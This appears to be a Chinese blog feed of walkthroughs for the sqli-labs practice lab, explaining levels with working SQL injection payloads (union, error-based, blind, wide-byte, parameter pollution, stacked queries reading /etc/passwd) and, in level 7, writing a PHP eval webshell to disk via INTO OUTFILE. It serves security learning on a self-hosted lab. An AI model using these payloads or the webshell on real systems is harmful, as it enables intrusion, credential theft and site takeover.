<p>这里的payload是<code>1&#39;,&#39;2&#39;,(select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t))#</code></p>
<p>我们也可以用extractvalue,updatexml等函数的报错注入来简化payload。</p>
<h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><p>看关卡标题我们就可以知道这关和上关类似，不过这次我们需要修改的是Referer请求头，Referer指的是发起请求的上一页面也就是要从哪跳转到下一页面。</p>
<p>我们构造的payload和上一关类似</p>
<p><code>1&#39;,extractvalue(1,concat(0x7e,(select database()))))#</code></p>
<p>因为源码中insert语句的变量少了。</p>
<p><img src="/../images/1735725090372.jpg" alt="1735725090372" loading="lazy"></p>
<p>注入成功。</p>
<h1 id="less20-cookie"><a href="#less20-cookie" class="headerlink" title="less20(cookie)"></a>less20(cookie)</h1><p>首先尝试直接在username和password注入，无果，我们可以首先使用合法的账户登录，再由标题可知我们可以从cookie下手，既然页面能显示我的cookie，那么他一定在后台获取了我的cookie，又显示了我的账户密码，我们便可以猜测是通过检验cookie中的uname的值来显示不同的账号密码，我们查看源码。</p>
<p><img src="/../images/1736838783987.jpg" alt="1736838783987" loading="lazy"></p>
<p>我们便能知道注入点就是那个SQL语句。我们只要修改cookie的值便能进行注入。例如</p>
<p><img src="/../images/1736839137733.jpg" alt="1736839137733" loading="lazy"></p>
<p>我们便可以得到想要的值。</p>
<h1 id="less21-cookie"><a href="#less21-cookie" class="headerlink" title="less21(cookie)"></a>less21(cookie)</h1><p>同上，不过是括号加单引号闭合，且是base64编码。</p>
<h1 id="less22-cookie"><a href="#less22-cookie" class="headerlink" title="less22(cookie)"></a>less22(cookie)</h1><p>同20，但是双引号</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less1-7</title>
    <url>/2024/11/06/less1-7/</url>
    <content><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p><strong>首先判断是否存在sql注入漏洞：</strong></p>
<p>利用无论字符型还是整型都会因为单引号个数不匹配而报错，输入?id&#x3D;1（? 是查询字符串的开始标志，它告诉服务器URL的这一部分包含的是查询参数。）正常返回，输入?id&#x3D;1’,报错，说明存在注入.<img src="/../images/1730902369074.jpg" alt="1730902369074" loading="lazy"></p>
<p><strong>判断sql注入漏洞的类型：</strong></p>
<p>通常sql注入漏洞的类型有两种:数字型和字符型。</p>
<p><em>判断</em>：当输入的参 x 为整型时，Sql 语句大致如下：select * from &lt;表</p>
<p>名&gt; where id &#x3D; x这种类型可以使用的and 1&#x3D;1 和 and 1&#x3D;2 可以通过加，</p>
<p>减，乘，除等运算来判断输入参数周围有没有引号来包围来判断：Url 地</p>
<p>址中输入x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。Url 地址中继</p>
<p>续输入x and 1&#x3D;2页面运行正常，则说明输入参数有引号包围，为字符型。</p>
<p><img src="/images/1730902565152.jpg" loading="lazy"></p>
<p><strong>判断表的字段数：</strong></p>
<p>使用order by 函数来判断，order by函数是用来让返回</p>
<p>的结果集以某一列来排序，输入 id&#x3D;1’ order by 3–+（–+可以使后面的</p>
<p>代码变成注释从而无法执行）正常，说明存在第三列，再输入id&#x3D;1’ order</p>
<p> by 4–+报错，说明只有三个字段。<img src="/images/1730902802300.jpg" loading="lazy"></p>
<p><strong>使用联合查询来爆显示位：</strong></p>
<p>输入?id&#x3D;-1’ union select 1,2,3 – +（）可</p>
<p>知显示位，这是将一个固定的结果集（在这个例子中是包含三列，每列的</p>
<p>值分别是 1、2、3 的单行）与原始查询的结果集合并，id&#x3D;-1是为了使前</p>
<p>面的查询为空，不然只会显示前面查询的结果。<img src="/images/1730902876253.jpg" loading="lazy"></p>
<p><strong>查看当前数据库：</strong></p>
<p>利用自带函数datebase()查询数据库名称。输入?id&#x3D;-2’ union select 1,2,database() –+。<img src="/images/1730903040670.jpg" loading="lazy"></p>
<p><strong>查表名：</strong></p>
<p>利用GROUP_CONCAT函数将一个字段的多行连接成一个字符串并显示，即?id&#x3D;-1’ union select 1,2,GROUP_CONCAT(table_name) from </p>
<p>information_schema.<code>TABLES</code> where table_schema &#x3D;’security’;–+</p>
<p>(information_schema是MySQL中默认建立的数据库里面包含scheata，</p>
<p>tables，columns。有我们想要的表名)<img src="/images/1730903363614.jpg" loading="lazy"></p>
<p><strong>查列名：</strong></p>
<p>同样利用GROUP_CONCAT。即GROUP_CONCAT(column_name) from information_schema.columns where table_name &#x3D;’users’ and table_schema&#x3D;’security’<img src="/images/1730941402519.jpg" loading="lazy"></p>
<p><strong>查询账户以及密码：</strong></p>
<p>同样使用GROUP_CONCAT函数，?id&#x3D;-1’ union select1</p>
<p>,group_concat(username),group_concat(password) from users – +即</p>
<p>可得到账户密码。<img src="/images/1730941548996.jpg" loading="lazy"></p>
<p>。</p>
<h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><p>与less1类似不过是整形注入，输入id的时候后面不用加引号啥的。</p>
<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>输入id&#x3D;1’发现报错信息和之前有点不一样，多了个括号。</p>
<p><img src="/../images/1730944460794.jpg" alt="1730944460794" loading="lazy"></p>
<p>我们查看源码发现是单引号和括号型的。<img src="/../images/1730944568271.jpg" alt="1730944568271" loading="lazy"></p>
<p>我们尝试加括号，可以了。<img src="/../images/1730944652494.jpg" alt="1730944652494" loading="lazy"></p>
<p>接下来就和less1一样。</p>
<h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>是双引号加括号的注入，别的步骤与less1类似</p>
<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>先判断什么类型的注入，由前面的知识易得是单引号注入。但与之前不一样的是，这里如果正确查询是不返回信息的，只有错误才返回错误信息。![3327075-20240202223242845-678741103 (1)](..&#x2F;images&#x2F;3327075-20240202223242845-678741103 (1).png)</p>
<p><img src="/../images/3327075-20240202223254490-408531609.png" alt="3327075-20240202223254490-408531609" loading="lazy"></p>
<p>我们便可以想到盲注</p>
<p><strong>方法1</strong>；<strong>布尔盲注</strong></p>
<p>基本原理是根据返回页面的正确与否来判断我们的查询代码是否能正常执行。</p>
<p>布尔盲注主要用到<strong>length()</strong>,<strong>ascii()</strong> ,**substr()**这三个函数，</p>
<p><strong>length（）</strong> 返回括号中字符串的长度；<strong>ASCII（）</strong> 返回的是括号中字符或字符串的第一个字符的ASCII码；<strong>substr(str,start,len)</strong> 截取“str”字符串从第“start”位开始的“len”长度的字符。</p>
<p>首先用<strong>length（）</strong> 确定你要查询的库名或表名或字段名的长度，再用</p>
<p><strong>ASCII（substr(库名，start，len))&#x3D;…</strong> 来判断库名的某个字符是什么。为了提高效率，我们可以使用代码批量操作，这里不作说明。</p>
<p> <strong>方法2</strong>；<strong>双查询注入</strong></p>
<p>关于啥是双查询注入请看 [双查询注入](<a href="https://blog.csdn.net/weixin_43901998/article/details/105227678">Less 5-6（双注入）_less-5-CSDN博客</a>)的后半部分。</p>
<p><em>我们摘出重要的部分：</em></p>
<p><img src="/../images/188c1b8f4eb7bf37cd72dbb26d6a446e.png" alt="188c1b8f4eb7bf37cd72dbb26d6a446e" loading="lazy"></p>
<p><em>上面这张图就是group by通过floor分组的过程。<br>我们知道floor产生的随机序列是固定的011011,再进行group by分组的时候，我会将这个随机序列作为虚拟表的key, 进行查询和插入两步操作。我们假设要先查询后插入，这里我把没有查询到值的查询用黑色，查询到值的查询用红色。</em></p>
<p><em>下面来描述一下查询和插入的过程：</em></p>
<p><em>第一次查询，再虚拟表中查询key为0的字段，发现虚拟表为空，因此进行插入操作。<br>第一次插入，再进行插入操作的时候，group by会再次调用floor()，因此插入的key是1而不是0，还会将对应的count()值填在key的后面。<br>第二次查询，查询时，group by再一次调用floor，得到的值为1，查询虚拟表中是否有key为1的字段，发现存在，因此此处的插入操作就是将coun()的值进行叠加。此时第二次查询操作和插入操作都已经完毕，然后进行第三次查询。<br>第三次查询，此时查询的key为0，发现虚拟表中没有0，因此要进行插入操作。<br>第三次插入，再进行插入前，group by要调用floor()，得到了1，因此要插入一个key为1的字段。而key为1的字段已经存在了，因此主键重复，MySQL会报错。（图上多画了一个最后红色的查询3，可以忽略掉）</em></p>
<p>了解双查询注入后，我们便可以编辑代码测试。</p>
<p><code>?id=1&#39; and (select (floor(rand(0)*2 )) as a,count(*) from information_schema.tables group by a)--+</code></p>
<p>但发现<img src="/../images/1731121921050.jpg" alt="1731121921050" loading="lazy"></p>
<p>经过查询，是因为如果在一个条件语句（如 <code>WHERE</code> 或 <code>AND</code>）中使用子查询，并且子查询返回了多个列，那么会引发 <code>Operand should contain 1 column(s)</code> 错误。因为在这种情况下，MySQL 不知道如何将多个列与外部查询的某个列进行比较。我们这里就是返回了两列结果。</p>
<p>我们改进一下，在子查询前加上select 1，这样子and后的整个查询语句只会关系子查询是否有结果而不会在意有几列。</p>
<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
<p>我们便可以用concat来连接我们想要查询的数据。所以最终的公式为</p>
<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),查询语句) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
<p><img src="/../images/1731124371854.jpg" alt="1731124371854" loading="lazy"></p>
<p>（注意1是报错输出的一部分，无视就好了）</p>
<p>接下来我们便可以查询我们想要数据了。</p>
<p>例如查表名</p>
<p><img src="/../images/1731126185859.jpg" alt="1731126185859" loading="lazy"></p>
<p><strong>记得给查询语句加括号 : )</strong></p>
<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>和第五题差不多，只要把单引号换成双引号就行。</p>
<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>根据前面的知识我们可以知道本题为单引号双括号注入。</p>
<p><img src="/../images/%E5%9B%BE%E7%89%871.jpg" alt="图片1" loading="lazy"></p>
<p>根据提示我们需要用到 <strong>into outfile</strong> 来写入一句话木马以便我们使</p>
<p>用工具来控制网站。</p>
<p>使用方法为 <strong>select … into outfile “绝对路径”</strong> ，这里我们也需要</p>
<p>使用 union select。</p>
<p>这段代码可以将 select 的内容注入进绝对路径下的一个文件，我</p>
<p>们这里注入到一个 7.php 的文件下，如果没有这个文件会自动创</p>
<p>建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最</p>
<p>好一次成功，如果要再次写入则需要更换文件名。</p>
<p>这里使用 into outfile 需要有写入权限与绝对路径，由于靶场是我</p>
<p>们自己搭建的，很容易知道网站的绝对路径，至于写入权限我们</p>
<p>可以在终端中查看。<img src="/../images/%E5%9B%BE%E7%89%872.jpg" alt="图片2" loading="lazy"></p>
<p>如果 secure_file_priv 为 null，在 MySQL 版本低于 5.7.6 是默认任</p>
<p>意写入的，我这里是更高的版本代表禁止写入，所以要在配置文</p>
<p>件 my.ini 中加入 <strong>secure_file_priv&#x3D;”\”</strong>便有写入权限。</p>
<p>接下来便可开始进行注入，PHP 格式的一句话木马为：</p>
<p><strong><?php @eval($_POST['mima']);?></strong> </p>
<p>“mima”是我们之后用工具需要的密码</p>
<p>所以我们的注入语句为<code>?id=1’)) union select 1,2,’&lt;?php@eval($_POST[‘mima’]);?&gt;’ into outfile &quot;C:\\PHP\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test.php&quot;--+</code></p>
<p><img src="/../images/%E5%9B%BE%E7%89%873.jpg" alt="图片3" loading="lazy"></p>
<p>虽然报错的，但我们打开文件夹可以看到已经有文件存在了</p>
<p>接下来就可以使用 webshell 工具（这里以蚁剑为例）</p>
<p><img src="/../images/%E5%9B%BE%E7%89%874.jpg" alt="图片4" loading="lazy"></p>
<p>连接成功。我们便可以对网站进行操控。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less28-less37</title>
    <url>/2025/02/18/less28-less37/</url>
    <content><![CDATA[<h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>本关除了过滤注释符和空格，还将连续的<strong>union select</strong>给过滤了，我们可以使用双写绕过。</p>
<h2 id="a0的问题"><a href="#a0的问题" class="headerlink" title="%a0的问题"></a>%a0的问题</h2><p>在别人的博客中我们发现有人使用%a0来代替空格是不会被过滤的，查询资料发现，是因为php版本不同在php5.2.17中，%a0是可以被解析成空格的，而php7中却不行。</p>
<h1 id="less29-31"><a href="#less29-31" class="headerlink" title="less29-31"></a>less29-31</h1><p>这三关除了字符注入类型不同，其他方面几乎是一致的。</p>
<p>源代码中出现了<code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code></p>
<p>当这行代码执行时，它会从当前请求的 URL 中提取查询字符串，并将其存储在 <code>$qs</code> 变量中。这样你就可以在PHP脚本中使用这个查询字符串来获取请求参数，进行条件判断，或者执行其他逻辑。例如，在 URL <code>http://example.com/page.php?name=John&amp;age=30</code> 中，查询字符串是 <code>name=John&amp;age=30</code>。</p>
<p>当输入正常参数时，网页返回正常信息，当输入单引号时，网页会被切换到hacked.php，应该是注入参数被WAF防御了。查看源码</p>
<p>login.php：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">	$match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">	if($match)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo &quot;you are good&quot;;</span><br><span class="line">		//return $match;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">		//echo &quot;you are bad&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">	foreach($qs_array as $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,0,2);</span><br><span class="line">		if($val==&quot;id&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,3,30); </span><br><span class="line">			return $id_value;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>whitelist（）：</p>
<p>是用于检查输入是否为纯数字，如果不是则跳转到 hacked.php</p>
<p>java_implimentation（）：</p>
<p>explode()把字符串打散为数组，例如$str&#x3D;”Hello World”在explode(“ “;$str)函数作用下就被打散成了Array([0] &#x3D;&gt; Hello ，[1] &#x3D;&gt; World)</p>
<p>而foreach()函数主要作用就是遍历数组，将数组被分割的数组一一输出出来。这个函数有两种语法：</p>
<ul>
<li>foreach (array_expression as $value):每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步</li>
<li>foreach (array_expression as $key &#x3D;&gt; $value)：同语句一，同时当前单元的键名在每次循环中赋值给$key。</li>
</ul>
<p>这两个自定义函数的效果就是将语句以“&amp;”为标识分割开，然后再分割开的数组的前两位找id值，如果找到了就截取这个数组的第4位到30位的长度交给preg_match()进行正则匹配。</p>
<p>对此我们可以使用 <strong>HTTP 参数污染攻击</strong></p>
<p>原理为：</p>
<p>截图等来自《MySQL注入天书：Less 29》</p>
<p><img src="/../images/bc43cb9cc3e035dee1f34323fb0ae1c2.png" alt="bc43cb9cc3e035dee1f34323fb0ae1c2" loading="lazy"></p>
<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
<p>接下来是参数解析的问题。<br>问：index.php?id&#x3D;1&amp;id&#x3D;2，这时回显是id&#x3D;1还是id&#x3D;2呢？<br>答：apache (php) 解析最后一个参数，即回显id&#x3D;2；tomcat (jsp) 解析第<br>一个参数，即回显id&#x3D;1。</p>
<p>大多数服务器对于参数解析：</p>
<p><img src="/../images/09d8f68230d3ee833917982a92d043dd.png" alt="09d8f68230d3ee833917982a92d043dd" loading="lazy"></p>
<p>这里有一个新问题。<br>问：index.jsp?id&#x3D;1&amp;id&#x3D;2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？<br>答：此处应该还是id&#x3D;2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</p>
<p>而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</p>
<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id&#x3D;1&amp;id&#x3D;0 or 1&#x3D;1–+，tomcat 只检查第一个参数id&#x3D;1，而对第二个参数id&#x3D;0 or 1&#x3D;1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
<p>该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p>
<p>less-30双引号注入，less-31双引号加括号注入，语句构建思路与29关完全一致。</p>
<h1 id="less32-33-35-36"><a href="#less32-33-35-36" class="headerlink" title="less32-33&amp;35&amp;36"></a>less32-33&amp;35&amp;36</h1><p>Less 32、33、35、36 都涉及到了对注入参数的转义，在一般情况下是不能注入的。但是当数据库使用 GBK 国标码或者其他编码时，可以使用恶意的参数把用于转义的斜杠“吃掉”变成其他字符，这就是所谓宽字节注入。使用宽字节注入绕过转义之后，其他的注入步骤和 Less 1 相似。</p>
<p>查看源码发现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>preg_quote(&#39;\\&#39;)</code>**：<code>preg_quote</code> 函数用于转义正则表达式中的特殊字符。由于反斜杠（<code>\</code>）在正则表达式中是特殊字符，所以需要先对其进行转义。这里传入的 <code>\\</code> 实际上表示一个反斜杠字符，因为在 PHP 字符串中，反斜杠本身是转义字符，所以需要用两个反斜杠来表示一个实际的反斜杠。<code>preg_quote(&#39;\\&#39;)</code> 的结果是 <code>\\</code>，表示匹配一个实际的反斜杠字符。</li>
<li><strong><code>preg_replace</code><strong>：该函数用于执行正则表达式的搜索和替换操作。第一个参数是正则表达式模式，这里是 <code>/\\/</code>，表示匹配字符串中的反斜杠字符。第二个参数是替换字符串，<code>\\\\\\</code> 在 PHP 字符串中表示两个连续的反斜杠（<code>\\</code>），因为每个反斜杠都需要用两个反斜杠来转义。</strong>所以这行代码的作用是将字符串中的每个反斜杠替换为两个反斜杠，还在‘前加上反斜杠以转义，实现反斜杠的转义。</strong></li>
</ul>
<p>接着是这句代码：<br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br>这行代码的作用是设置客户端（即PHP脚本）与MySQL数据库服务器之间编码使用GBK国标码。</p>
<p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。</p>
<p>接下来就用联合查询注入</p>
<p>less33和32差不多，less-33与32关的区别在于这关使用了addslashes()函数进行过滤操作，此处的过滤函数是 <strong>addslashes() 函数</strong>，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy Highlighter-hljsfunction <span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$string</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>less35是数值型转义就没用了。</p>
<p>而less-36则是使用了mysql_real_escape_string()进行过滤，本质上都没什么差别。</p>
<h1 id="less34-37"><a href="#less34-37" class="headerlink" title="less34&amp;37"></a>less34&amp;37</h1><p>less34是用 **addslashes() **过滤的</p>
<p>less37是用**mysql_real_escape_string()**函数进行过滤</p>
<p>这两个和之前的差不多不过是post传参。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less23-27</title>
    <url>/2025/01/14/less23-27/</url>
    <content><![CDATA[<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>尝试之前的get题的方法发现总是有语法错误，而且报错内容中多出一个引号，我们可以推断我们注释符号没有起作用，查看源码。</p>
<p><img src="/../images/1736866487923.jpg" alt="1736866487923" loading="lazy"></p>
<p>果然给干没了，既然不能注释掉多余的引号那么我们可以想到使用多个or来中和掉多出来的一个引号payload如下:</p>
<p><code> ?id=2&#39;  or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p>
<p>成功。</p>
<p><img src="/../images/1736866811069.jpg" alt="1736866811069" loading="lazy"></p>
<h1 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h1><p>首先查找注入点</p>
<p><img src="/../images/1738307969207.jpg" alt="1738307969207" loading="lazy"></p>
<p>发现在登录和注册都有过滤，我们试着登录看看</p>
<p><img src="/../images/1738308060203.jpg" alt="1738308060203" loading="lazy"></p>
<p>发现能改密码，但也过滤了，无思路，我们看看源码。发现这里是用session获取的用户名且并没过滤，这就是注入点</p>
<p><img src="/../images/1738308271201(1).jpg" alt="1738308271201(1)" loading="lazy"></p>
<p><img src="/../images/1738308636055.jpg" alt="1738308636055" loading="lazy"></p>
<p>这里的原理是注册一个危险字段的用户，由于通过session获取的时候没过滤，那么储存在session中的危险字段便能利用（这里注册时的转义只是暂时的）。</p>
<p>我们讲用户名注册成例如这样</p>
<p><code>admin&#39;#</code></p>
<p>此时sql语句变成这样</p>
<p><code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;</code></p>
<p>那么#后面的语句便被注释了，也就是说我们不需要知道当下的密码便可以修改admin的密码。</p>
<h1 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25&amp;less25a"></a>less25&amp;less25a</h1><p>由提示可知，”AND”和”OR”被过滤了，那么我们可以使用双写绕过。</p>
<p><strong>双写绕过：</strong></p>
<p>即讲“or”写成“OorR”，这样中间的“or”会被过滤掉，而“OR”则被留下，值得注意的是，如果在payload中的其他单词中也有“or”或者“and”的部分，则也要双写以防被过滤。</p>
<p>less25a则是数字型注入，其余和less25差不多。</p>
<h1 id="less26-less26a"><a href="#less26-less26a" class="headerlink" title="less26&amp;less26a"></a>less26&amp;less26a</h1><p>在这一关，除了or 和and被过滤，还有注释符和空格也被过滤了，那么我们可以利用其他的字符代替使用<strong>“%a0”</strong> 或<strong>“%0b”</strong> 替代空格，使用<strong>“||”</strong> 替代 “or”，使用<strong>“%26%26”</strong> 替代 “and”。</p>
<p>26a不回显报错信息，所以我们只能让信息爆在显示位上。</p>
<h1 id="less27-less27a"><a href="#less27-less27a" class="headerlink" title="less27&amp;less27a"></a>less27&amp;less27a</h1><p>or和and没被过滤，不过空格和注释符还有select和union被过滤了。我们可以用<strong>大小写过滤</strong>，即将大小写混杂，也可以使用报错注入来回显信息。</p>
<p>27a报错无回显，那么就用大小写过滤。</p>
<p>我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：<br><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">正则表达式中的修正符</a></p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less38-41</title>
    <url>/2025/02/18/less38-41/</url>
    <content><![CDATA[<p><strong>Less 38 ~ 41 虽然使用 Less 1 的方式注入即可注入成功，但是这 4 关存在堆叠注入漏洞。我们可以使用 “;” 闭合第一个 SQL 语句，然后在后面执行任意的 SQL 语句，通过这个漏洞我们可以对数据库执行任意的操作。</strong></p>
<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>此处使用 Less 1 的 payload 就可以完成注入，此处用于测试堆叠注入。所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。</p>
<p>堆叠注入攻击<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句<br>新建一个表<code>select * from users;create table A like users;</code><br>删除创建的A表<code>select * from users;drop table test;</code><br>查询数据<code>select * from users;select B,C,D;</code><br>加载文件<code>select * from users;select load_file(&#39;/etc/passwd&#39;);</code><br>增加一条数据<code>select * from users;insert into users values(18,&#39;zhong&#39;,&#39;zhong&#39;);</code></p>
<p>查看源码发现源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询。</p>
<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>和less38一样，不过是数值型注入。</p>
<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>也是堆叠注入不过是单引号和括号型。</p>
<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>和39差不多也是堆叠注入的数值型。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less42-45</title>
    <url>/2025/02/19/less42-45/</url>
    <content><![CDATA[<p><strong>Less 42 ~ 45 是使用 POST 提交参数的登录界面，username 字段进行了参数过滤，但是 password 字段没有。此处可以在 password 字段使用万能密码直接夺取用户，也可以在该字段处使用堆叠注入。</strong></p>
<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p>在用户名使用万能密码测试，全部都登录失败。</p>
<p>在密码字段使用万能密码测试，使用单引号闭合时登录成功。说明用户名参数注入时存在过滤，密码字段存在单引号闭合的字符型注入。</p>
<p>可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less 38 的测试流程，每次登陆时完成一步堆叠注入。</p>
<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>和less42一样，不过是单引号和括号闭合。</p>
<h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>和less42一样</p>
<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>和less43一样</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less46-49</title>
    <url>/2025/02/19/less46-49/</url>
    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
<p>把所有类型测试完发现是数值型注入。</p>
<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
]]></content>
      <tags>
        <tag>sqlilab注入 web</tag>
      </tags>
  </entry>
  <entry>
    <title>less50-53</title>
    <url>/2025/02/19/less50-53/</url>
    <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>数值型注入，和 Less 46 一样使用报错注入就可以完成</p>
<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>单引号闭合的字符型注入，和 Less 47 一样使用报错注入就可以完成。</p>
